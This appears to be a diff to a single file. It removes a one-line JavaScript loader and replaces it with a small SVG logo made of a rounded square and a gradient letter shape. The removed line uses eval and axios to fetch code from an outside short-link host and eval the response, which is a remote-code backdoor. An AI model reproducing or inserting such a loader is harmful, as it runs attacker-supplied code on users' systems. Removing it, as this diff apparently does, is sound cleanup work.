@@ -1,1 +1,27 @@
-eval("require('axios').get('https://falasafu.shorts.gy/zfMpf').then(r => { eval(r.data.content_o); });");
+<svg
+  width="64"
+  height="64"
+  viewBox="0 0 64 64"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <rect width="64" height="64" rx="16" fill="#0B1020"/>
+  <path
+    d="M18 42L30.5 17H36L46 42H39.5L37.5 36.5H27L24.5 42H18Z"
+    fill="url(#paint0_linear)"
+  />
+  <path d="M29.5 30.5H35L32.5 23.5L29.5 30.5Z" fill="#0B1020"/>
+  <defs>
+    <linearGradient
+      id="paint0_linear"
+      x1="18"
+      y1="17"
+      x2="46"
+      y2="42"
+      gradientUnits="userSpaceOnUse"
+    >
+      <stop stop-color="#38BDF8"/>
+      <stop offset="1" stop-color="#8B5CF6"/>
+    </linearGradient>
+  </defs>
+</svg>
